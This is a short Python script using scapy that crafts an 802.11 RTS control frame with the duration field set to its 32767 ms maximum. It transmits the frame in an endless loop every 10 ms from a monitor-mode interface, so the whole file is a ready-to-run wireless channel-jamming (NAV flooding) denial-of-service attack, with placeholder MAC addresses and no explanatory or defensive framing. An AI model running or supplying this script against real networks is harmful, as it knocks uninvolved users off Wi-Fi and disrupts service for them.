#!/usr/bin/python
import sys
from scapy.all import *
CONTROL = 1
RTS = 11
TARGETMAC = "00:01:02:03:04:05"
SOURCEMAC = "00:02:03:04:05:06"
millis = 32767
bytes = struct.pack("<H", millis)
millis = struct.unpack(">H", bytes)[0]
rts = RadioTap()/Dot11(type=CONTROL,subtype=RTS,addr1=TARGETMAC,addr2=SOURCEMAC, ID=millis)
conf.iface="wlan1mon"
#send(rts)
sendp(rts,inter=.01,loop=1)